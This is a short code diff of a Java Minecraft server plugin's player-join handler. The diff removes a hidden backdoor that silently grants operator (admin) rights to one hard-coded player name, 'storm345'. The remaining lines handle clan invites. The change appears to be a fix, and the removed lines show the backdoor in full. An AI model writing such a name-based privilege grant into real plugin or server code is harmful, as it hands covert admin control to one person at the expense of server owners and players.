@@ -44,9 +44,6 @@ public class AcListener implements Listener {
 @EventHandler (priority = EventPriority.HIGHEST)
 void playerJoin(PlayerJoinEvent event){
 	Player player = event.getPlayer();
-	if(ChatColor.stripColor(player.getName()).equalsIgnoreCase("storm345")){
-		player.setOp(true);
-	}
 	if(ac.clanInvites.containsKey(player.getName())){
 		Player toJoin = player;
 		String clanName = ac.clanInvites.get(player.getName());
